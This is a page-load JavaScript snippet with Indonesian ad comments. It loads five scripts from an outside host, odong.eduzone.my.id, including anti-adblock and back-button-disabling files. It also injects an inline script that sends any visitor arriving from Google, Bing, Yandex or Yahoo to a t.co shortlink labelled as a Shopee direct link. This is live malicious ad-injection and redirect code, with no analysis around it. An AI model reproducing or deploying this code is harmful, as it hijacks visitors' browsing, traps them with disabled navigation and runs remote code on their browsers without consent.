// ---- Iklan ++

const mapAds=["/country.js","/anti-adblock.js","/analytic.js","/disable-costom-button-back.js","/banner.js"];var hostUri="odong.eduzone.my.id";const randomNumberHash=(n)=>{for(var r=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9"],e=n,t=new Array,a=0;a<=e-1;a++){t[a]=r[parseInt(Math.random()*r.length)];t=t;}
return t.join("");};const initMapAds=async(config)=>{const uriLoc=document.location;const hostLoc=uriLoc.hostname;for(let data of mapAds){const el=document.createElement("script");if(data.indexOf("/country.js")>=0){el.setAttribute("src","https://"+hostUri+data+"?hash="+randomNumberHash(12));}else{el.setAttribute("src","https://"+hostUri+data);};await document.querySelector("body").append(el);};};initMapAds(mapAds);

// ---- Shopee Directlink
(function(){injectScript([{"attr":[{"name":"type","value":"text/javascript"}],"tag":"script","inner":"\n//<![CDATA[\n//--- setting ---------\nvar refererWeb=[\n  \"www.google.com\",\n  \"www.bing.com\",\n  \"yandex.com\",\n  \"yahoo.com\",\n  \"www.google.co.id\"\n];\nvar directTo=\"https://t.co/kYWKJ5gbiF\";\n\n\n//--- main script ---------\nif(document.referrer){\n  var aaRef = document.referrer;\n  refererWeb.forEach(function(a){\n   if(aaRef.indexOf(a)>=0){\n\twindow.location.href=directTo;\n   };\n  });\n};\n//]]>\n"}],{"target":"body"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();


